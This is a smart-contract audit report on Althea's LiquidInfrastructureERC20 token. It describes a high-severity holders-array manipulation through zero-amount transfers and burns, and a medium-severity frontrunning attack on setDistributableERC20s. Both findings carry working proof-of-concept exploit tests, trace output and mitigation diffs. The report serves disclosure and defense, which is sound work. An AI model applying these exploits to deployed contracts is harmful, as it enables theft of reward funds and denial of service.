| Severity | Title | 
|:--:|:---|
| [H-01](#h-01-holders-array-can-be-manipulated-by-transferring-or-burning-with-amount-0-stealing-rewards-or-bricking-certain-functions) | Holders array can be manipulated by transferring or burning with amount 0, stealing rewards or bricking certain functions |
| [M-01](#m-01-distribution-can-be-bricked-and-double-claims-by-a-few-holders-are-possible-when-owner-calls-liquidinfrastructureerc20setdistributableerc20s) | Distribution can be bricked, and double claims by a few holders are possible when owner calls LiquidInfrastructureERC20::setDistributableERC20s |

# [H-01] Holders array can be manipulated by transferring or burning with amount 0, stealing rewards or bricking certain functions
## Impact
LiquidInfrastructureERC20._beforeTokenTransfer() checks if the to address has a balance of 0, and if so, adds the address to the holders array.

LiquidInfrastructureERC20#L142-145
```solidity
bool exists = (this.balanceOf(to) != 0);
if (!exists) {
    holders.push(to);
}
```
However, the ERC20 contract allows for transferring and burning with amount = 0, enabling users to manipulate the holders array.

An approved user that has yet to receive tokens can initiate a transfer from another address to themself with an amount of 0. This enables them to add their address to the holders array multiple times. Then, LiquidInfrastructureERC20.distribute() will loop through the user multiple times and give the user more rewards than it should.
```solidity
for (i = nextDistributionRecipient; i < limit; i++) {
    address recipient = holders[i];
    if (isApprovedHolder(recipient)) {
        uint256[] memory receipts = new uint256[](
            distributableERC20s.length
        );
        for (uint j = 0; j < distributableERC20s.length; j++) {
            IERC20 toDistribute = IERC20(distributableERC20s[j]);
            uint256 entitlement = erc20EntitlementPerUnit[j] *
                this.balanceOf(recipient);
            if (toDistribute.transfer(recipient, entitlement)) {
                receipts[j] = entitlement;
            }
        }

        emit Distribution(recipient, distributableERC20s, receipts);
    }
}
```
This also enables any user to call burn with an amount of 0, which will push the zero address to the holders array causing it to become very large and prevent LiquidInfrastructureERC20.distributeToAllHolders() from executing.

## Proof of Concept
```solidity
it("malicious user can add himself to holders array multiple times and steal rewards", async function () {
    const { infraERC20, erc20Owner, nftAccount1, holder1, holder2 } = await liquidErc20Fixture();
    const nft = await deployLiquidNFT(nftAccount1);
    const erc20 = await deployERC20A(erc20Owner);

    await nft.setThresholds([await erc20.getAddress()], [parseEther('100')]);
    await nft.transferFrom(nftAccount1.address, await infraERC20.getAddress(), await nft.AccountId());
    await infraERC20.addManagedNFT(await nft.getAddress());
    await infraERC20.setDistributableERC20s([await erc20.getAddress()]);

    const OTHER_ADDRESS = '0x1111111111111111111111111111111111111111'

    await infraERC20.approveHolder(holder1.address);
    await infraERC20.approveHolder(holder2.address);

    // Malicious user transfers 0 to himself to add himself to the holders array
    await infraERC20.transferFrom(OTHER_ADDRESS, holder1.address, 0);

    // Setup balances
    await infraERC20.mint(holder1.address, parseEther('1'));
    await infraERC20.mint(holder2.address, parseEther('1'));
    await erc20.mint(await nft.getAddress(), parseEther('2'));
    await infraERC20.withdrawFromAllManagedNFTs();

    // Distribute to all holders fails because holder1 is in the holders array twice
    // Calling distribute with 2 sends all funds to holder1
    await mine(500);
    await expect(infraERC20.distributeToAllHolders()).to.be.reverted;
    await expect(() => infraERC20.distribute(2))
        .to.changeTokenBalances(erc20, [holder1, holder2], [parseEther('2'), parseEther('0')]);
    expect(await erc20.balanceOf(await infraERC20.getAddress())).to.eq(parseEther('0'));
});

it("malicious user can add zero address to holders array", async function () {
    const { infraERC20, erc20Owner, nftAccount1, holder1 } = await liquidErc20Fixture();

    for (let i = 0; i < 10; i++) {
        await infraERC20.burn(0);
    }
    // I added a getHolders view function to better see this vulnerability
    expect((await infraERC20.getHolders()).length).to.eq(10);
});
```

## Lines of code
https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L142-L145
https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L214-L231

## Tool used
Manual Review

## Recommended Mitigation Steps
Adjust the logic in _beforeTokenTransfer to ignore burns, transfers where the amount is 0, and transfers where the recipient already has a positive balance.
```solidity
function _beforeTokenTransfer(
    address from,
    address to,
    uint256 amount
) internal virtual override {
    require(!LockedForDistribution, "distribution in progress");
    if (!(to == address(0))) {
        require(
            isApprovedHolder(to),
            "receiver not approved to hold the token"
        );
    }
    if (from == address(0) || to == address(0)) {
        _beforeMintOrBurn();
    }
-   bool exists = (this.balanceOf(to) != 0);
-   if (!exists) {
+   if (to != address(0) && balanceOf(to) == 0 && amount > 0)
       holders.push(to);
   }
}
```

# [M-01] Distribution can be bricked, and double claims by a few holders are possible when owner calls LiquidInfrastructureERC20::setDistributableERC20s
## Impact
Double claim, DOS by bricking distribution, few holders can lose some rewards due to missing validation of distribution timing when owner calling LiquidInfrastructureERC20::setDistributableERC20s.
```solidity
    function setDistributableERC20s(
        address[] memory _distributableERC20s
    ) public onlyOwner {
        distributableERC20s = _distributableERC20s;
    }
```
This issue will be impact on following ways :

when a new token is accepted by any nft it should be added as a desirable token, or a new managerNFT with a new token, then also LiquidInfrastructureERC20::setDistributableERC20s  has to be called to distribute the rewards.
so when owner calls LiquidInfrastructureERC20::setDistributableERC20s which adds a new token as desired token,

Bricking distrubution to holders: Check the POC for proof
     when a new token is added, we can expect revert when
    - the number of desirable tokens length array is increased
    - an attacker can frontrun and distribute to only one holder , so erc20EntitlementPerUnit is now  changed
    - Now the actual owner tx is processed, which increases/decreases the size of distributableERC20s array.
    - But now distribution is not possible because the Out of Bound revert on the distribution function because distributableERC20s array is changed, but erc20EntitlementPerUnit array size is same before the distributableERC20s array is modified.
```solidity
            for (uint j = 0; j < distributableERC20s.length; j++) {
                uint256 entitlement = erc20EntitlementPerUnit[j] *  this.balanceOf(recipient);
                if (IERC20(distributableERC20s[j]).transfer(recipient, entitlement)) {
                    receipts[j] = entitlement;
                }
            }
```

Double claim by a holder:  so some holder can DOS by
    - A last holder of the 10 holders array frontrun  this owner tx (setDistributableERC20s) and calls LiquidInfrastructureERC20::distribute with 90% of the holders count as params, so all the rewards of old desirable tokens will be distributed to 9 holders.
    - Now after the owners action, backrun it to distribute to the last holder, which will also receive new token as rewards.
    - The previous holders can also claim their share in the next distribution round, but the last holder also can claim which makes double claim possible, which takes a cut from all other holders.

if owner calls LiquidInfrastructureERC20::setDistributableERC20s which removes some token, then any token balance in the contract will be lost until the owner re-adds the token, and it can be distributed again.

All the issues can be countered if the LiquidInfrastructureERC20::setDistributableERC20s is validated to make changes happen only after any potential distributions

## Proof of Concept
The logs of the POC shows the revert Index out of bounds
```solidity
    ├─ [24677] LiquidInfrastructureERC20::distribute(1)
    │   ├─ [624] LiquidInfrastructureERC20::balanceOf(0x0000000000000000000000000000000000000002) [staticcall]
    │   │   └─ ← 100000000000000000000 [1e20]
    │   ├─ [20123] ERC20::transfer(0x0000000000000000000000000000000000000002, 500000000000000000000 [5e20])
    │   │   ├─ emit Transfer(from: LiquidInfrastructureERC20: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], to: 0x0000000000000000000000000000000000000002, value: 500000000000000000000 [5e20])
    │   │   └─ ← true
    │   ├─ [624] LiquidInfrastructureERC20::balanceOf(0x0000000000000000000000000000000000000002) [staticcall]
    │   │   └─ ← 100000000000000000000 [1e20]
    │   └─ ← "Index out of bounds"
    └─ ← "Index out of bounds"
```
First run forge init --force then run forge i openzeppelin/openzeppelin-contracts@v4.3.1 and modify foundry.toml file into below
```solidity
[profile.default]
- src = "contracts"
+ src = "src"
out = "out"
libs = ["lib"]
```
Then copy the below POC into test/Test.t.sol and run forge t --mt test_POC -vvvv
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.12;


import {Test, console2} from "forge-std/Test.sol";
import {LiquidInfrastructureERC20} from "../contracts/LiquidInfrastructureERC20.sol";
import {LiquidInfrastructureNFT} from "../contracts/LiquidInfrastructureNFT.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";


contract AltheaTest is Test {
    function setUp() public {}


    function test_POC() public {
        // setup
        LiquidInfrastructureNFT nft = new LiquidInfrastructureNFT("LP");
        address[] memory newErc20s = new address[](1);
        uint256[] memory newAmounts = new uint[](1);
       
        ERC20 DAI = new ERC20("DAI", "DAI");
        ERC20 USDC = new ERC20("USDC", "USDC");


        string memory _name = "LP";
        string memory _symbol = "LP";
        uint256 _minDistributionPeriod = 5;
        address[] memory _managedNFTs = new address[](1);
        address[] memory _approvedHolders = new address[](2);
        address[] memory _distributableErc20s = new address[](1);


        _managedNFTs[0] = address(nft);
        _approvedHolders[0] = address(1);
        _approvedHolders[1] = address(2);
        _distributableErc20s[0] = address(DAI);


        newErc20s[0] = address(DAI);
        nft.setThresholds(newErc20s, newAmounts);
        LiquidInfrastructureERC20 erc = new  LiquidInfrastructureERC20(
            _name, _symbol, _managedNFTs, _approvedHolders, _minDistributionPeriod, _distributableErc20s);
        erc.mint(address(1), 100e18);
        erc.mint(address(2), 100e18);


        // issue ==  change in desirable erc20s
        _distributableErc20s = new address[](2);
        _distributableErc20s[0] = address(DAI);
        _distributableErc20s[1] = address(USDC);
        newAmounts = new uint[](2);
        newErc20s = new address[](2);
        newErc20s[0] = address(DAI);
        newErc20s[1] = address(USDC);
        nft.setThresholds(newErc20s, newAmounts);


        deal(address(DAI), address(erc), 1000e18);
        deal(address(USDC), address(erc), 1000e18);
        vm.roll(block.number + 100);


        // frontrun tx
        erc.distribute(1);


        // victim tx
        erc.setDistributableERC20s(_distributableErc20s);


        // backrun tx
        vm.roll(block.number + _minDistributionPeriod);
        vm.expectRevert(); // Index out of bounds
        erc.distribute(1);
    }


}
```

## Lines of code
https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441
https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L222

## Tool used
Manual Review

## Recommended Mitigation Steps
Modify LiquidInfrastructureERC20::setDistributableERC20s to only change the desirable tokens after a potential distribution for fair reward sharing.
```solidity
    function setDistributableERC20s(
        address[] memory _distributableERC20s
    ) public onlyOwner {
+       require(!_isPastMinDistributionPeriod(), "set only just after distribution");
        distributableERC20s = _distributableERC20s;
    }
```
